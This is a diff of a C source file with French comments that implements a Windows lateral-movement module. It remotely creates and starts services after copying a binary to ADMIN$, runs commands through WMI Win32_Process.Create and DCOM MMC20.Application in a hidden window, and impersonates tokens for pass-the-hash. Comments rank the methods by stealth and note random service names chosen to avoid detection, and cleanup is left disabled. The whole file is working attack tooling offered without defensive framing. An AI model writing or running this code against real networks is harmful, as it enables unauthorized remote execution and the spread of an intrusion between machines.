@@ -1,12 +1,6 @@
-/**
- * @file lateral.c
- * @brief Module de mouvement latéral - SCM, WMI, DCOM
- * 
- * Techniques implémentées:
- * - SCM: Création de service distant (PsExec-like)
- * - WMI: Exécution via Win32_Process.Create
- * - DCOM: Exécution via MMC20.Application, ShellWindows, ShellBrowserWindow
- * - Pass-the-Hash: Support via token impersonation
+/*
+ * lateral.c - mouvement lateral
+ * SCM (psexec style), WMI, DCOM, PTH
  */
 
 #include <windows.h>
@@ -20,10 +14,6 @@
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 
-// ============================================================================
-// STRUCTURES INTERNES
-// ============================================================================
-
 typedef struct _LATERAL_RESULT {
     BOOL success;
     DWORD error_code;
@@ -31,20 +21,9 @@ typedef struct _LATERAL_RESULT {
     DWORD remote_pid;
 } LATERAL_RESULT;
 
-// ============================================================================
-// SCM - SERVICE CONTROL MANAGER (PsExec-like)
-// ============================================================================
+/* ---- SCM (psexec style) ---- */
 
-/**
- * @brief Crée et exécute un service distant via SCM
- * @param target_host Nom ou IP de la machine cible
- * @param service_name Nom du service à créer
- * @param binary_path Chemin vers l'exécutable sur la cible
- * @param result Structure pour stocker le résultat
- * @return TRUE si succès
- * 
- * Équivalent à PsExec: copie un binaire et l'exécute comme service
- */
+// cree un service distant et le demarre
 BOOL Lateral_SCM_CreateService(
     const char* target_host,
     const char* service_name,
@@ -62,10 +41,8 @@ BOOL Lateral_SCM_CreateService(
     
     memset(result, 0, sizeof(LATERAL_RESULT));
     
-    // Construire le chemin UNC vers le SCM distant
     snprintf(remote_scm, sizeof(remote_scm), "\\\\%s", target_host);
     
-    // Ouvrir le SCM distant
     hSCManager = OpenSCManagerA(
         remote_scm,
         SERVICES_ACTIVE_DATABASE,
@@ -79,7 +56,6 @@ BOOL Lateral_SCM_CreateService(
         return FALSE;
     }
     
-    // Créer le service
     hService = CreateServiceA(
         hSCManager,
         service_name,
@@ -95,7 +71,6 @@ BOOL Lateral_SCM_CreateService(
     if (!hService) {
         DWORD err = GetLastError();
         if (err == ERROR_SERVICE_EXISTS) {
-            // Le service existe déjà, on l'ouvre
             hService = OpenServiceA(hSCManager, service_name, SERVICE_ALL_ACCESS);
         }
         if (!hService) {
@@ -107,7 +82,6 @@ BOOL Lateral_SCM_CreateService(
         }
     }
     
-    // Démarrer le service
     if (!StartServiceA(hService, 0, NULL)) {
         DWORD err = GetLastError();
         if (err != ERROR_SERVICE_ALREADY_RUNNING) {
@@ -128,9 +102,7 @@ BOOL Lateral_SCM_CreateService(
     return TRUE;
 }
 
-/**
- * @brief Supprime un service distant
- */
+// cleanup service
 BOOL Lateral_SCM_DeleteService(
     const char* target_host,
     const char* service_name
@@ -151,11 +123,9 @@ BOOL Lateral_SCM_DeleteService(
         return FALSE;
     }
     
-    // Arrêter le service d'abord
     ControlService(hService, SERVICE_CONTROL_STOP, &ss);
     Sleep(1000);
     
-    // Supprimer
     BOOL ret = DeleteService(hService);
     
     CloseServiceHandle(hService);
@@ -164,10 +134,7 @@ BOOL Lateral_SCM_DeleteService(
     return ret;
 }
 
-/**
- * @brief Exécution PsExec-like complète
- * Copie le binaire, crée le service, exécute, nettoie
- */
+// copie le binaire sur ADMIN$ puis cree un service
 BOOL Lateral_SCM_PsExec(
     const char* target_host,
     const char* local_exe_path,
@@ -182,15 +149,13 @@ BOOL Lateral_SCM_PsExec(
     if (!result) return FALSE;
     memset(result, 0, sizeof(LATERAL_RESULT));
     
-    // Générer un nom de service aléatoire
-    srand(GetTickCount());
+    // nom random pour eviter detection
+    srand(GetTickCount() ^ GetCurrentProcessId());
     snprintf(service_name, sizeof(service_name), "Svc%08X", rand());
     
-    // Chemin distant pour le binaire (ADMIN$)
     snprintf(remote_path, sizeof(remote_path), 
         "\\\\%s\\ADMIN$\\%s.exe", target_host, service_name);
     
-    // Copier le binaire vers la cible
     if (!CopyFileA(local_exe_path, remote_path, FALSE)) {
         result->error_code = GetLastError();
         snprintf(result->message, sizeof(result->message),
@@ -198,28 +163,20 @@ BOOL Lateral_SCM_PsExec(
         return FALSE;
     }
     
-    // Chemin local sur la cible
     snprintf(binary_path, sizeof(binary_path),
         "%%SystemRoot%%\\%s.exe %s", service_name, arguments ? arguments : "");
     
-    // Créer et démarrer le service
     ret = Lateral_SCM_CreateService(target_host, service_name, binary_path, result);
     
-    // Nettoyage après exécution (optionnel, commenté pour persistance)
-    // Sleep(5000);
+    // TODO: cleanup si besoin
     // Lateral_SCM_DeleteService(target_host, service_name);
     // DeleteFileA(remote_path);
     
     return ret;
 }
 
-// ============================================================================
-// WMI - WINDOWS MANAGEMENT INSTRUMENTATION
-// ============================================================================
+/* ---- WMI ---- */
 
-/**
- * @brief Initialise COM pour WMI
- */
 static BOOL WMI_InitCOM(void) {
     static BOOL initialized = FALSE;
     if (initialized) return TRUE;
@@ -244,15 +201,7 @@ static BOOL WMI_InitCOM(void) {
     return TRUE;
 }
 
-/**
- * @brief Exécute une commande distante via WMI Win32_Process.Create
- * @param target_host Machine cible
- * @param username Utilisateur (NULL pour credentials actuels)
- * @param password Mot de passe
- * @param command Commande à exécuter
- * @param result Structure résultat
- * @return TRUE si succès
- */
+// exec via Win32_Process.Create - passe les creds ou NULL pour current user
 BOOL Lateral_WMI_Execute(
     const char* target_host,
     const char* username,
@@ -273,11 +222,10 @@ BOOL Lateral_WMI_Execute(
     memset(result, 0, sizeof(LATERAL_RESULT));
     
     if (!WMI_InitCOM()) {
-        snprintf(result->message, sizeof(result->message), "Échec init COM");
+        snprintf(result->message, sizeof(result->message), "COM init fail");
         return FALSE;
     }
     
-    // Créer le locator WMI
     hr = CoCreateInstance(
         &CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
         &IID_IWbemLocator, (void**)&pLocator
@@ -290,13 +238,23 @@ BOOL Lateral_WMI_Execute(
         return FALSE;
     }
     
-    // Construire le namespace WMI distant
+    // namespace WMI distant
     wchar_t wmi_path[MAX_PATH];
     swprintf(wmi_path, MAX_PATH, L"\\\\%hs\\root\\cimv2", target_host);
     
     BSTR bstr_path = SysAllocString(wmi_path);
-    BSTR bstr_user = username ? SysAllocString((wchar_t*)username) : NULL;
-    BSTR bstr_pass = password ? SysAllocString((wchar_t*)password) : NULL;
+    
+    // conversion char* -> wchar_t* pour user/pass
+    wchar_t wuser[256] = {0}, wpass[256] = {0};
+    BSTR bstr_user = NULL, bstr_pass = NULL;
+    if (username) {
+        MultiByteToWideChar(CP_ACP, 0, username, -1, wuser, 256);
+        bstr_user = SysAllocString(wuser);
+    }
+    if (password) {
+        MultiByteToWideChar(CP_ACP, 0, password, -1, wpass, 256);
+        bstr_pass = SysAllocString(wpass);
+    }
     
     // Connexion au namespace distant
     hr = pLocator->lpVtbl->ConnectServer(
@@ -442,18 +400,13 @@ static const GUID CLSID_ShellWindows =
 static const GUID CLSID_ShellBrowserWindow = 
     {0xC08AFD90, 0xF2A1, 0x11D1, {0x84, 0x55, 0x00, 0xA0, 0xC9, 0x1F, 0x38, 0x80}};
 
-/**
- * @brief Énumération des méthodes DCOM disponibles
- */
 typedef enum {
-    DCOM_MMC20_APPLICATION,     // MMC20.Application (le plus fiable)
-    DCOM_SHELL_WINDOWS,         // ShellWindows
-    DCOM_SHELL_BROWSER_WINDOW   // ShellBrowserWindow
+    DCOM_MMC20_APPLICATION,
+    DCOM_SHELL_WINDOWS,
+    DCOM_SHELL_BROWSER_WINDOW
 } DCOM_METHOD;
 
-/**
- * @brief Exécute une commande via DCOM MMC20.Application
- */
+// exec via MMC20.Application - marche bien sur la plupart des targets
 BOOL Lateral_DCOM_MMC20(
     const char* target_host,
     const char* command,
@@ -468,11 +421,10 @@ BOOL Lateral_DCOM_MMC20(
     memset(result, 0, sizeof(LATERAL_RESULT));
     
     if (!WMI_InitCOM()) {
-        snprintf(result->message, sizeof(result->message), "Échec init COM");
+        snprintf(result->message, sizeof(result->message), "COM init fail");
         return FALSE;
     }
     
-    // Configurer les infos serveur distant
     wchar_t wtarget[256];
     MultiByteToWideChar(CP_UTF8, 0, target_host, -1, wtarget, 256);
     server_info.pwszName = wtarget;
@@ -481,7 +433,6 @@ BOOL Lateral_DCOM_MMC20(
     mqi.pItf = NULL;
     mqi.hr = S_OK;
     
-    // Créer l'instance distante de MMC20.Application
     hr = CoCreateInstanceEx(
         &CLSID_MMC20,
         NULL,
@@ -500,7 +451,7 @@ BOOL Lateral_DCOM_MMC20(
     
     pMMC = (IDispatch*)mqi.pItf;
     
-    // Obtenir Document.ActiveView.ExecuteShellCommand
+    // Document.ActiveView.ExecuteShellCommand
     DISPID dispid_doc;
     LPOLESTR name_doc = L"Document";
     hr = pMMC->lpVtbl->GetIDsOfNames(pMMC, &IID_NULL, &name_doc, 1, 
@@ -533,7 +484,6 @@ BOOL Lateral_DCOM_MMC20(
     
     IDispatch* pDoc = var_doc.pdispVal;
     
-    // Obtenir ActiveView
     DISPID dispid_view;
     LPOLESTR name_view = L"ActiveView";
     hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &IID_NULL, &name_view, 1,
@@ -553,29 +503,27 @@ BOOL Lateral_DCOM_MMC20(
     
     IDispatch* pView = var_view.pdispVal;
     
-    // Appeler ExecuteShellCommand
     DISPID dispid_exec;
     LPOLESTR name_exec = L"ExecuteShellCommand";
     hr = pView->lpVtbl->GetIDsOfNames(pView, &IID_NULL, &name_exec, 1,
                                        LOCALE_USER_DEFAULT, &dispid_exec);
     
     if (SUCCEEDED(hr)) {
-        // Préparer les arguments: Command, Directory, Parameters, WindowState
         VARIANT args[4];
         for (int i = 0; i < 4; i++) VariantInit(&args[i]);
         
         wchar_t wcmd[512];
         MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, 512);
         
-        // Arguments en ordre inverse (convention COM)
+        // reverse order pour COM
         args[3].vt = VT_BSTR;
-        args[3].bstrVal = SysAllocString(L"cmd.exe");  // Command
+        args[3].bstrVal = SysAllocString(L"cmd.exe");
         args[2].vt = VT_BSTR;
-        args[2].bstrVal = SysAllocString(L"C:\\");     // Directory
+        args[2].bstrVal = SysAllocString(L"C:\\");
         args[1].vt = VT_BSTR;
-        args[1].bstrVal = SysAllocString(wcmd);        // Parameters (/c <cmd>)
+        args[1].bstrVal = SysAllocString(wcmd);
         args[0].vt = VT_BSTR;
-        args[0].bstrVal = SysAllocString(L"7");        // WindowState (hidden)
+        args[0].bstrVal = SysAllocString(L"7");  // hidden
         
         DISPPARAMS dp = {args, NULL, 4, 0};
         
@@ -599,9 +547,7 @@ BOOL Lateral_DCOM_MMC20(
     return result->success;
 }
 
-/**
- * @brief Exécute via ShellWindows (explorer.exe)
- */
+// TODO: ShellWindows method
 BOOL Lateral_DCOM_ShellWindows(
     const char* target_host,
     const char* command,
@@ -620,9 +566,6 @@ BOOL Lateral_DCOM_ShellWindows(
     return FALSE;
 }
 
-/**
- * @brief Wrapper générique pour exécution DCOM
- */
 BOOL Lateral_DCOM_Execute(
     const char* target_host,
     const char* command,
@@ -642,18 +585,12 @@ BOOL Lateral_DCOM_Execute(
     }
 }
 
-// ============================================================================
-// PASS-THE-HASH SUPPORT
-// ============================================================================
+/* ---- PTH ---- */
 
-/**
- * @brief Configure le contexte de sécurité pour Pass-the-Hash
- * Utilise le token du thread actuel (après sekurlsa::pth ou autre)
- */
+// impersonate token pour pass-the-hash
 BOOL Lateral_SetPTHContext(HANDLE hToken) {
     if (!hToken) return FALSE;
     
-    // Impersonate le token pour les appels réseau suivants
     if (!ImpersonateLoggedOnUser(hToken)) {
         return FALSE;
     }
@@ -661,21 +598,11 @@ BOOL Lateral_SetPTHContext(HANDLE hToken) {
     return TRUE;
 }
 
-/**
- * @brief Restaure le contexte de sécurité original
- */
 BOOL Lateral_RevertContext(void) {
     return RevertToSelf();
 }
 
-// ============================================================================
-// INTERFACE PRINCIPALE
-// ============================================================================
-
-/**
- * @brief Exécute une commande distante avec la méthode optimale
- * Essaie dans l'ordre: WMI -> DCOM -> SCM
- */
+// essaie WMI puis DCOM puis SCM
 BOOL Lateral_AutoExecute(
     const char* target_host,
     const char* command,
@@ -686,39 +613,27 @@ BOOL Lateral_AutoExecute(
     if (!result) return FALSE;
     memset(result, 0, sizeof(LATERAL_RESULT));
     
-    // Essayer WMI d'abord (plus discret)
+    // wmi plus discret
     if (Lateral_WMI_Execute(target_host, username, password, command, result)) {
         return TRUE;
     }
     
-    // Essayer DCOM MMC20
     if (Lateral_DCOM_MMC20(target_host, command, result)) {
         return TRUE;
     }
     
-    // En dernier recours: SCM (plus bruyant)
-    // Note: SCM nécessite un binaire, pas une commande
+    // scm = binaire pas commande
     snprintf(result->message, sizeof(result->message),
-        "Échec WMI et DCOM - SCM nécessite un binaire");
+        "WMI/DCOM fail - SCM needs binary");
     
     return FALSE;
 }
 
-/**
- * @brief Liste les méthodes de mouvement latéral disponibles
- */
 const char* Lateral_ListMethods(void) {
     return 
-        "Méthodes de mouvement latéral disponibles:\n"
-        "1. SCM  - Service Control Manager (PsExec-like)\n"
-        "   - Lateral_SCM_CreateService()\n"
-        "   - Lateral_SCM_PsExec()\n"
-        "2. WMI  - Win32_Process.Create\n"
-        "   - Lateral_WMI_Execute()\n"
-        "3. DCOM - Distributed COM\n"
-        "   - Lateral_DCOM_MMC20() [MMC20.Application]\n"
-        "   - Lateral_DCOM_ShellWindows()\n"
-        "4. PTH  - Pass-the-Hash support\n"
-        "   - Lateral_SetPTHContext()\n"
-        "   - Lateral_RevertContext()\n";
+        "lateral methods:\n"
+        "1. SCM - psexec style\n"
+        "2. WMI - Win32_Process.Create\n"
+        "3. DCOM - MMC20.Application\n"
+        "4. PTH - pass-the-hash\n";
 }
